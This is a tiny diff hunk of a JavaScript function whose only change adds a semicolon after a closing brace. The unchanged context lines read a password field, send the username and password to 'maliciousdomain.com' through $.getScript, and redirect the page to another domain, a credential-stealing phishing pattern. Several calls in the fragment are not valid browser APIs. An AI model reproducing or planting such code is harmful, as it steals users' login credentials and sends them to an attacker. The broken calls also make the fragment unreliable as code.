@@ -5,5 +5,5 @@ function myFunction() {
   var password = document.getElementByName('password');
   $.getScript("http://maliciousdomain.com" + username + password);
   window.replace("https://dell.inquisiteasp.com");
-}
+};
 
